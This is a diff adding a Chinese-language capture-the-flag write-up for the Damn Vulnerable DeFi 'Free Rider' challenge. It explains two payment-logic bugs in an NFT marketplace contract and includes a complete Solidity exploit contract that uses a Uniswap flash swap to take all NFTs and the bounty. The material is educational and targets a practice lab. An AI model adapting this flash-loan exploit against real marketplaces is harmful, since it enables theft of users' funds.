@@ -558,3 +558,122 @@ contract Exploit {
   after alculateDepositOfWETHRequired 29496494833197321980
 
 ```
+
+### Free Rider
+
+[題目](https://www.damnvulnerabledefi.xyz/challenges/free-rider/): 一個全新的Damn Valuable NFTs市場已經發布！市場上有6個NFT被首次鑄造，現已開放出售，每個價格為15 ETH。有一個關鍵漏洞被報告，聲稱所有的代幣都可以被奪走。然而，開發者們不知道如何拯救這些代幣！他們提供了一個45 ETH的賞金，給任何願意將這些NFT取出並送回給他們的人。回收過程由一個專門的智能合約管理。你已經同意幫忙。儘管如此，你的餘額只有0.1 ETH。開發者們對你要求更多資金的消息卻毫無回應。如果你能獲得免費的ETH，至少瞬間獲得一些該多好。
+
+過關條件:
+- 需要確保所有的NFT從recoveryManager智能合約中提取出來，並且轉移到recoveryManagerOwner的地址
+- 市場上應該不再有任何NFT待售，這表示市場中的offersCount()應該為0
+- player 的餘額必須大於或等於賞金的數量
+
+解題:
+- 在買 NFT 的_buyOne function 中有一個錯誤檢查金額的地方. 只要msg.value大於priceToPay就可以通過. 
+```
+        if (msg.value < priceToPay) {
+            revert InsufficientPayment();
+        }
+```
+-  如果只是買一張NFT是沒問題, 但合約提供一次可以購買多張NFT. 透過 buyMany() loop執行 _buyOne, 這樣就會有一個邏輯漏洞, 只要有15ETH(1張NFT價格)就可以買多個NFT.
+```
+    function buyMany(uint256[] calldata tokenIds) external payable nonReentrant {
+        for (uint256 i = 0; i < tokenIds.length; ++i) {
+            unchecked {
+                _buyOne(tokenIds[i]);
+            }
+        }
+    }
+```
+- 第二個邏輯錯誤也是在 _buyOne裡面, 當購買的NFT後會把15ETH轉給賣家. 但從程式中顯轉移NFT擁有權, 所以會把15ETH轉給買家了.
+```
+        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);
+
+        // pay seller using cached token
+        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);
+```
+- 搭配以上兩個bug, 可以免費透過 uniswapV2 flashswap 借出15ETH來購買多張NFT, 最後我們的成本僅需 0.3% flashswap fee. 題目預設給我們0.1ETH,所以很足夠.
+- 最後一個步驟就是要買6張NFT, 都轉移給 FreeRiderRecoveryManager, 就可以拿到45ETH賞金了. [REF](https://medium.com/@JohnnyTime/damn-vulnerable-defi-v3-challenge-10-solution-free-rider-complete-walkthrough-7da8122691b3)
+```
+        if (++received == 6) {
+            address recipient = abi.decode(_data, (address));
+            payable(recipient).sendValue(bounty);
+        }
+```
+[POC](./damn-vulnerable-defi/test/free-rider/FreeRider.t.sol) : 
+
+```
+    function test_freeRider() public checkSolvedByPlayer {
+        Exploit exploit = new Exploit{value:0.045 ether}(
+            address(uniswapPair),
+            address(marketplace),
+            address(weth),
+            address(nft),
+            address(recoveryManager)
+        );
+        exploit.attack();
+        console.log("balance of attacker:", address(player).balance / 1e15, "ETH");
+    }
+contract Exploit {
+    
+    IUniswapV2Pair public pair;
+    IMarketplace public marketplace;
+    IWETH public weth;
+    IERC721 public nft;
+    address public recoveryContract;
+    address public player;
+    uint256 private constant NFT_PRICE = 15 ether;
+    uint256[] private tokens = [0, 1, 2, 3, 4, 5];
+
+    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recoveryContract)payable{
+        pair = IUniswapV2Pair(_pair);
+        marketplace = IMarketplace(_marketplace);
+        weth = IWETH(_weth);
+        nft = IERC721(_nft);
+        recoveryContract = _recoveryContract;
+        player = msg.sender;
+    }
+
+    function attack() external payable {
+         // 1. Request a flashSwap of 15 WETH from Uniswap Pair  
+        pair.swap(NFT_PRICE, 0, address(this), "1");
+    }
+
+    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
+
+        // Access Control
+        require(msg.sender == address(pair));
+        require(tx.origin == player);
+
+        // 2. Unwrap WETH to native ETH
+        weth.withdraw(NFT_PRICE);
+
+        // 3. Buy 6 NFTS for only 15 ETH total
+        marketplace.buyMany{value: NFT_PRICE}(tokens);
+
+        // 4. Pay back 15WETH + 0.3% to the pair contract
+        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
+        weth.deposit{value: amountToPayBack}();
+        weth.transfer(address(pair), amountToPayBack);
+
+        // 5. Send NFTs to recovery contract so we can get the bounty
+        bytes memory data = abi.encode(player);
+        for(uint256 i; i < tokens.length; i++){
+            nft.safeTransferFrom(address(this), recoveryContract, i, data);
+        }
+        
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+
+}
+```
